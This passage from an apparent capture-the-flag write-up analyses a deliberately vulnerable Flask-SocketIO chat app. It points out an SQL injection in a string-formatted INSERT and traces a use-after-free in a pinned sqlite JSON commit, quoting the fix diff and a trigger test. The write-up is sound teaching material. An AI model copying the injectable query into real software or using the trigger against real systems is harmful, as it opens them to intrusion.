34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">&#x27;)&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    db</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">cursor</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">execute</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">s</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    db</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">commit</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    data </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;msg&quot;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> message</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    socketio</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">emit</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;recv_message&quot;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> data</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">return</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;Success&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token decorator annotation punctuation" style="color:hsl(119, 34%, 47%)">@socketio</span><span class="token decorator annotation punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token decorator annotation punctuation" style="color:hsl(119, 34%, 47%)">on</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;connect&quot;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">handle_new_connection</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    cursor </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> get_db</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">cursor</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    s </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f&quot;SELECT message FROM messages&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    cursor</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">execute</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">s</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    messages </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> cursor</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">fetchall</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">for</span><span class="token plain"> message </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">in</span><span class="token plain"> messages</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        data </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;msg&quot;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> message</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        socketio</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">emit</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;recv_message&quot;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> data</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> to</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">request</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">sid</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token decorator annotation punctuation" style="color:hsl(119, 34%, 47%)">@socketio</span><span class="token decorator annotation punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token decorator annotation punctuation" style="color:hsl(119, 34%, 47%)">on</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;new_message&quot;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">handle_new_message</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">data</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    message </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> data</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;msg&quot;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">if</span><span class="token plain"> message </span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token plain"> </span><span class="token boolean" style="color:hsl(35, 99%, 36%)">None</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">or</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">len</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">message</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">return</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    db </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> get_db</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    s </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f&quot;INSERT INTO messages (message) VALUES (&#x27;</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">message</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">&#x27;)&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    db</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">cursor</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">execute</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">s</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    db</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">commit</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    socketio</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">emit</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;recv_message&quot;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> data</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">if</span><span class="token plain"> __name__ </span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;__main__&quot;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    socketio</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">run</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">app</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> host</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;0.0.0.0&quot;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> port</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">5000</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> debug</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token boolean" style="color:hsl(35, 99%, 36%)">False</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><br></span></code></pre></div></div>
<p>The app is fairly simple:</p>
<ul>
<li>A user can send a message (handled by <code>handle_new_message</code>), which is stored to a sqlite database using an <code>INSERT</code> statement.</li>
<li>A user connecting to the server (handled by <code>handle_new_connection</code>) will receive all the messages currently in the database.</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="sql-injection">SQL injection<a href="#sql-injection" class="hash-link" aria-label="Direct link to SQL injection" title="Direct link to SQL injection">​</a></h3>
<p>The first vulnerability is fairly easy to spot:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">s </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f&quot;INSERT INTO messages (message) VALUES (&#x27;</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">message</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">&#x27;)&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">db</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">cursor</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">execute</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">s</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><br></span></code></pre></div></div>
<p>When inserting the message into the database, it&#x27;s inserted directly into the statement using string formatting, instead of something like prepared statements, without checking the contents of the message or escaping problematic characters. This is a classic SQL injection.</p>
<p>Unfortunately we can&#x27;t use it for an RCE in this case, and it&#x27;s not like the flag (or anything useful) is in the database. So what on earth is this useful for?</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="where-s-the-pwn">Where&#x27;s the pwn?<a href="#where-s-the-pwn" class="hash-link" aria-label="Direct link to Where&#x27;s the pwn?" title="Direct link to Where&#x27;s the pwn?">​</a></h3>
<p>The app is written in python, so it&#x27;s not like the app itself can have any memory corruption bugs either, so what gives? Isn&#x27;t this meant to be a pwn challenge???</p>
<p>Well upon closer inspection of the <code>Dockerfile</code>, we notice something interesting.</p>
<div class="language-docker codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-docker codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">RUN git clone https://github.com/sqlite/sqlite &amp;&amp; \</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    cd sqlite &amp;&amp; \</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    git checkout 66dacae4c3f818d0a9e94ecb4433c823a69a98aa &amp;&amp; \</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    ./configure &amp;&amp; \</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    make &amp;&amp; \</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    cp .libs/libsqlite3.so.0.8.6 /usr/lib/x86_64-linux-gnu/</span><br></span></code></pre></div></div>
<p>While most of the installs are normal, this one stands out, because it&#x27;s compiling its own <em>very specific</em> version of <code>libsqlite3</code> using a commit hash. So, what if there was a vulnerability in this version of <code>libsqlite3</code>? Well the python library wouldn&#x27;t be implementing all the logic itself, it would instead reuse existing code, which would come from libraries like <code>libsqlite3</code>, so a vulnerability here would also be a vulnerability in python&#x27;s <code>sqlite3</code>, thus our application. And since we have SQL injection, we can pass arbitary SQL commands, so we&#x27;d have a decent amount of control in this hypothetical attack scenario.</p>
<p>Let&#x27;s first look at this <a href="https://github.com/sqlite/sqlite/commit/66dacae4c3f818d0a9e94ecb4433c823a69a98aa" target="_blank" rel="noopener noreferrer">commit</a>:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">git clone https://github.com/sqlite/sqlite</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">cd sqlite</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">git checkout 66dacae4c3f818d0a9e94ecb4433c823a69a98aa</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">git log</span><br></span></code></pre></div></div>
<figure><img src="/assets/image (132).png" alt=""><figcaption><p><code>git log</code></p></figcaption></figure>
<p>Having a brief look at the current commit didn&#x27;t ring any alarm bells. But what if there was a vulnerability that was reported and fixed in a later commit. Well scrolling up to the next commit reveals something very appealing:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">git log --reverse --all --ancestry-path ^HEAD</span><br></span></code></pre></div></div>
<figure><img src="/assets/image (161).png" alt=""><figcaption><p>Next commit</p></figcaption></figure>
<p>A potential UAF you say <!-- -->👀<!-- -->. Commit <a href="https://github.com/sqlite/sqlite/commit/faef28e6bd654e5061561423cb1ece6ca84f1f1f" target="_blank" rel="noopener noreferrer">faef28e6bd654e5061561423cb1ece6ca84f1f1f</a> includes a patch for the issue:</p>
<div class="language-diff codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-diff codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">@@ -2902,6 +2902,7 @@ static void jsonReplaceFunc(</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">   }</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">   pParse = jsonParseCached(ctx, argv[0], ctx, argc&gt;1);</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">   if( pParse==0 ) return;</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">+  pParse-&gt;nJPRef++;</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">   for(i=1; i&lt;(u32)argc; i+=2){</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">     zPath = (const char*)sqlite3_value_text(argv[i]);</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">     pParse-&gt;useMod = 1;</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">@@ -2914,6 +2915,7 @@ static void jsonReplaceFunc(</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">   jsonReturnJson(pParse, pParse-&gt;aNode, ctx, 1);</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"> replace_err:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">   jsonDebugPrintParse(pParse);</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">+  jsonParseFree(pParse);</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"> }</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"> </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"> </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">@@ -2948,6 +2950,7 @@ static void jsonSetFunc(</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">   }</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">   pParse = jsonParseCached(ctx, argv[0], ctx, argc&gt;1);</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">   if( pParse==0 ) return;</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">+  pParse-&gt;nJPRef++;</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">   for(i=1; i&lt;(u32)argc; i+=2){</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">     zPath = (const char*)sqlite3_value_text(argv[i]);</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">     bApnd = 0;</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">@@ -2964,9 +2967,8 @@ static void jsonSetFunc(</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">   }</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">   jsonDebugPrintParse(pParse);</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">   jsonReturnJson(pParse, pParse-&gt;aNode, ctx, 1);</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">-</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"> jsonSetDone:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">-  /* no cleanup required */;</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">+  jsonParseFree(pParse);</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"> }</span><br></span></code></pre></div></div>
<p>At first glance, one can assume that there&#x27;s a UAF occuring due to the <code>pParse</code> object&#x27;s reference count not being incremented, causing it to be incorrectly freed. But what is this talk about a JSON parser cache spill?</p>
<p>We&#x27;ve also been given some test cases which would supposedly trigger the bug:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># 2023-10-09 https://sqlite.org/forum/forumpost/b25edc1d46</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># UAF due to JSON cache overflow</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)">#</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">do_execsql_test json101</span><span class="token operator" style="color:hsl(221, 87%, 60%)">-</span><span class="token number" style="color:hsl(35, 99%, 36%)">22.1</span><span class="token plain"> {</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">SELECT</span><span class="token plain"> json_set</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token string" style="color:hsl(119, 34%, 47%)">&#x27;{}&#x27;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token string" style="color:hsl(119, 34%, 47%)">&#x27;$.a&#x27;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> json</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">&#x27;1&#x27;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token string" style="color:hsl(119, 34%, 47%)">&#x27;$.a&#x27;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> json</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">&#x27;2&#x27;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token string" style="color:hsl(119, 34%, 47%)">&#x27;$.b&#x27;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> json</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">&#x27;3&#x27;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token string" style="color:hsl(119, 34%, 47%)">&#x27;$.b&#x27;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> json</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">&#x27;4&#x27;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token string" style="color:hsl(119, 34%, 47%)">&#x27;$.c&#x27;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> json</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">&#x27;5&#x27;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token string" style="color:hsl(119, 34%, 47%)">&#x27;$.c&#x27;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> json</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">&#x27;6&#x27;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">} {{{</span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;a&quot;</span><span class="token plain">:</span><span class="token number" style="color:hsl(35, 99%, 36%)">2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span 